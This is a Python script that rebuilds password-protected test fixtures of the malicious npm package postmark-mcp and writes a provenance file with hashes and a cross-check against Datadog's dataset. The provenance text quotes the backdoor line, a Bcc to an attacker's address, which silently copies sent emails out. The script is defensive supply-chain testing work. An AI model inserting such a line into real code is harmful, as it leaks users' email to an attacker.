#!/usr/bin/env python3
"""Rebuild the postmark-mcp acceptance fixtures from their original sources.

This script exists so the fixtures are a *reproducible* artifact rather than
files someone once downloaded. Re-run it to re-verify the provenance chain.

    python3 tools/build_fixtures.py

Both versions were unpublished from npm on 2025-09-25 and no registry serves
them any more, so the bytes come from two independent third parties:

  jspm.io    caches unpublished packages; its build sourcemaps embed the
             original unminified source in `sourcesContent`. This is the ONLY
             surviving source for v1.0.16.
  Datadog    `malicious-software-packages-dataset` independently captured the
             genuine v1.0.15 npm tarball before the unpublish.

The chain that makes v1.0.16 trustworthy is indirect, and this script enforces
it: jspm's v1.0.15 extraction is compared byte-for-byte against Datadog's
independently captured tarball. If they match, the extraction method is sound,
and the same method applied to v1.0.16 is sound too. **If that check fails the
script aborts** rather than emitting a fixture we cannot vouch for.

Requires network access and the `zip` CLI.
"""

from __future__ import annotations

import hashlib
import json
import shutil
import ssl
import subprocess
import sys
import tempfile
import urllib.request
import zipfile
from pathlib import Path

JSPM = "https://ga.jspm.io/npm:postmark-mcp@{version}/{path}"
DATADOG = (
    "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/"
    "main/samples/npm/malicious_intent/postmark-mcp/1.0.15/2025-09-16-postmark-mcp-v1.0.15.zip"
)
FIXTURE_PASSWORD = b"infected"

REPO_ROOT = Path(__file__).resolve().parent.parent
OUT_DIR = REPO_ROOT / "fixtures" / "postmark-mcp"

# Established empirically on 2026-08-14 by running this script's verification
# path. They are asserted, not trusted: a mismatch aborts the build.
EXPECTED = {
    "1.0.15": "0007994c327f1cd3bfe99e8cc179000e063e25d77b6466f02e57e570857a3719",
    "1.0.16": "27214b8639d541c6c5671f53fd598c72d7b6531cd52dd828ecb5d1d42c6d663c",
}

# Files present in the real v1.0.15 tarball that we deliberately leave out of
# the fixture, with their hashes, so the omission is auditable. These are the
# attacker's own base64 round-trip test artifact: two byte-identical 3.99 MB
# copies of a public McKinsey PDF plus a metadata file. They are irrelevant to
# the gate and would add ~8 MB of binary to the repository.
OMITTED = {
    "package/tmp/mckinsey-global-surveys-2021-a-year-in-review.pdf": (
        3987886,
        "400e4bb16731a744dd9eefa9a58d6863a803bf9010fe5ffd65734c7b0f91b9b4",
    ),
    "package/tmp/mckinsey-global-surveys-2021-a-year-in-review.pdf.decoded": (
        3987886,
        "400e4bb16731a744dd9eefa9a58d6863a803bf9010fe5ffd65734c7b0f91b9b4",
    ),
    "package/tmp/mckinsey-global-surveys-2021-a-year-in-review.pdf.meta.json": (
        383,
        "1e08185f76ab2d669446086e278adb6e15c684a4694fb418258a194403957441",
    ),
}


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _tls_context() -> ssl.SSLContext:
    """Build a verifying TLS context.

    The macOS framework Python ships without a usable CA bundle, so the default
    context fails to verify anything. Fall back to certifi rather than to an
    unverified connection: we are downloading malware fixtures, and fetching
    them over a connection we cannot authenticate would be indefensible.
    """
    try:
        import certifi
    except ModuleNotFoundError:
        return ssl.create_default_context()
    return ssl.create_default_context(cafile=certifi.where())


def fetch(url: str) -> bytes:
    print(f"  fetch {url}")
    # Fixed https:// URLs defined as constants above; not attacker-controlled.
    with urllib.request.urlopen(url, timeout=120, context=_tls_context()) as resp:  # noqa: S310
        return resp.read()


def jspm_source(version: str) -> bytes:
    """Recover the original index.js for `version` from jspm's build sourcemap.

    jspm blanks the file's first line. The original starts with a shebang and a
    blank line (21 bytes); jspm replaces both with a single line of 20 spaces
    plus a newline, which is length-preserving. We splice the real prefix back.
    """
    raw = fetch(JSPM.format(version=version, path="index.js.map"))
    sources = json.loads(raw)["sourcesContent"][0].encode("utf-8")
    marker = sources.index(b"\n/**")
    return b"#!/usr/bin/env node\n\n" + sources[marker + 1 :]


def datadog_tarball(work: Path) -> tuple[zipfile.ZipFile, str]:
    """Download Datadog's captured v1.0.15 tarball; return it and its path prefix."""
    blob = fetch(DATADOG)
    path = work / "datadog-1.0.15.zip"
    path.write_bytes(blob)
    print(f"  datadog zip: {len(blob)} bytes sha256={sha256(blob)}")
    zf = zipfile.ZipFile(path)
    # The archive nests the package under a capture-time temp directory whose
    # name is not stable, so derive the prefix instead of hardcoding it.
    entry = next(n for n in zf.namelist() if n.endswith("/package/index.js"))
    return zf, entry[: -len("index.js")]


def build_tree(dest: Path, files: dict[str, bytes]) -> None:
    for rel, data in files.items():
        target = dest / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(data)


def make_encrypted_zip(tree: Path, out: Path) -> None:
    """Zip `tree` with a legacy-ZipCrypto password.

    The stdlib can read this format but cannot write it, so shell out to `zip`.
    The password is not a secret (it is in SECURITY.md); it stops the fixture
    being executed by accident or unpacked by a stray glob, and keeps it from
    tripping other people's scanners.
    """
    if out.exists():
        out.unlink()
    subprocess.run(  # noqa: S607
        ["zip", "-r", "-q", "-P", FIXTURE_PASSWORD.decode(), str(out), "package"],
        cwd=tree,
        check=True,
    )


def main() -> int:
    if shutil.which("zip") is None:
        sys.exit("`zip` CLI not found; required to write password-protected fixtures.")
    OUT_DIR.mkdir(parents=True, exist_ok=True)

    with tempfile.TemporaryDirectory() as tmp:
        work = Path(tmp)

        print("Recovering sources from jspm...")
        recovered = {v: jspm_source(v) for v in ("1.0.15", "1.0.16")}

        print("Fetching Datadog witness...")
        dd, prefix = datadog_tarball(work)
        real_15 = dd.read(prefix + "index.js", pwd=FIXTURE_PASSWORD)

        # The check the whole fixture rests on.
        print("\nCross-validating jspm extraction against Datadog capture...")
        if recovered["1.0.15"] != real_15:
            sys.exit(
                "ABORT: jspm's v1.0.15 extraction does not match Datadog's "
                f"independently captured tarball.\n"
                f"  jspm    : {len(recovered['1.0.15'])} bytes {sha256(recovered['1.0.15'])}\n"
                f"  datadog : {len(real_15)} bytes {sha256(real_15)}\n"
                "The extraction method is unsound, so the v1.0.16 fixture "
                "(which has no independent witness) cannot be trusted either."
            )
        print(f"  MATCH: {len(real_15)} bytes sha256={sha256(real_15)}")

        for version, data in recovered.items():
            if sha256(data) != EXPECTED[version]:
                sys.exit(
                    f"ABORT: v{version} index.js sha256 {sha256(data)} != "
                    f"expected {EXPECTED[version]}. Upstream content changed."
                )
        print("  Both versions match their pinned hashes.")

        # Shared files, taken from the real tarball. v1.0.15 -> v1.0.16 changed
        # index.js by one line and bumped package.json's version; nothing else
        # differs (verified against jspm's package.json for both versions).
        shared = {
            rel: dd.read(prefix + rel, pwd=FIXTURE_PASSWORD)
            for rel in ("README.md", "LICENSE", ".env.example")
        }
        manifest = json.loads(dd.read(prefix + "package.json", pwd=FIXTURE_PASSWORD))

        records: dict[str, dict[str, tuple[int, str]]] = {}
        for version in ("1.0.15", "1.0.16"):
            pkg = dict(manifest, version=version)
            files = {
                "package/index.js": recovered[version],
                "package/package.json": (json.dumps(pkg, indent=2) + "\n").encode(),
                **{f"package/{k}": v for k, v in shared.items()},
            }
            tree = work / version
            build_tree(tree, files)
            out = OUT_DIR / f"postmark-mcp-{version}.zip"
            make_encrypted_zip(tree, out)
            records[version] = {k: (len(v), sha256(v)) for k, v in files.items()}
            print(f"\n  wrote {out.relative_to(REPO_ROOT)} ({out.stat().st_size} bytes)")

        write_provenance(records)
    print("\nDone.")
    return 0


def write_provenance(records: dict[str, dict[str, tuple[int, str]]]) -> None:
    lines = [
        "# Provenance: postmark-mcp acceptance fixtures",
        "",
        "Generated by `tools/build_fixtures.py`. Re-run it to re-verify this chain.",
        "",
        "**These archives contain real, unmodified malicious code.** v1.0.16 is the",
        "package described in OSV [`MAL-2025-47604`](https://osv.dev/vulnerability/MAL-2025-47604).",
        "Password: `infected`. Do not unpack outside the sandbox.",
        "",
        "## Why the bytes did not come from npm",
        "",
        "`postmark-mcp` was fully unpublished from npm on 2025-09-25T03:31:54Z. The",
        "registry serves a tombstone with no `versions` and no tarball URLs. Confirmed",
        "404 across registry.npmjs.org, unpkg, jsdelivr, esm.sh, skypack, npmmirror and",
        "cnpmjs; Software Heritage has no capture and the Wayback Machine has zero",
        "snapshots. This is a *positively recorded unpublish*, not a lookup failure —",
        "a different fact, and one the tombstone lets us state precisely.",
        "",
        "## Sources",
        "",
        "| Version | index.js from | Independent witness |",
        "|---|---|---|",
        "| 1.0.15 | jspm.io build sourcemap | Datadog dataset (genuine npm tarball) |",
        "| 1.0.16 | jspm.io build sourcemap | **none — see below** |",
        "",
        "No independent copy of v1.0.16 is known to exist; Datadog captured only up to",
        "v1.0.15, and Snyk's writeup republished v1.0.18 rather than v1.0.16. The",
        "fixture is trusted by an indirect chain: jspm's v1.0.15 extraction reproduces",
        "Datadog's independently captured tarball **byte for byte**, which validates the",
        "extraction method, which is then applied unchanged to v1.0.16. The build script",
        "asserts this and aborts if it fails.",
        "",
        "## Assembly",
        "",
        "jspm blanks the first line of each file. The original begins with",
        "`#!/usr/bin/env node` and a blank line (21 bytes); jspm substitutes a single",
        "line of 20 spaces plus a newline, which preserves length. The build script",
        "splices the real prefix back and verifies the result against the pinned hash.",
        "",
        "`package.json` is the genuine v1.0.15 manifest from the Datadog tarball with",
        "`version` set per release. jspm's own copies of `package.json` for v1.0.15 and",
        "v1.0.16 were diffed and differ in **`version` only**, so no other field changed",
        "between the two releases. `README.md`, `LICENSE` and `.env.example` are taken",
        "verbatim from the real tarball and are identical across both versions.",
        "",
        "## The change under test",
        "",
        "The entire difference between v1.0.15 and v1.0.16 is one line, inside the",
        "`emailData` object literal of the `sendEmail` tool:",
        "",
        "```js",
        "Bcc: 'phan@giftshop.club',",
        "```",
        "",
        "It opens no new connection. Same host, same endpoint, same request count. The",
        "other three tools (`sendEmailWithTemplate`, `listTemplates`, `getDeliveryStats`)",
        "are unchanged and genuinely clean in v1.0.16.",
        "",
        "## Contents and hashes",
        "",
    ]
    for version, files in records.items():
        lines += [f"### v{version}", "", "| bytes | sha256 | path |", "|---|---|---|"]
        lines += [f"| {n} | `{h}` | `{p}` |" for p, (n, h) in sorted(files.items())]
        lines.append("")
    lines += [
        "## Deliberately omitted from the fixture",
        "",
        "Present in the real v1.0.15 tarball, excluded here. These are the attacker's",
        "own base64 round-trip test artifact — two byte-identical copies of a public",
        "McKinsey PDF plus a metadata file, ~8 MB in total, irrelevant to the gate.",
        "Listed with hashes so the omission is auditable rather than silent.",
        "",
        "| bytes | sha256 | path |",
        "|---|---|---|",
    ]
    lines += [f"| {n} | `{h}` | `{p}` |" for p, (n, h) in sorted(OMITTED.items())]
    lines.append("")
    (OUT_DIR / "PROVENANCE.md").write_text("\n".join(lines))
    print(f"  wrote {(OUT_DIR / 'PROVENANCE.md').relative_to(REPO_ROOT)}")


if __name__ == "__main__":
    raise SystemExit(main())
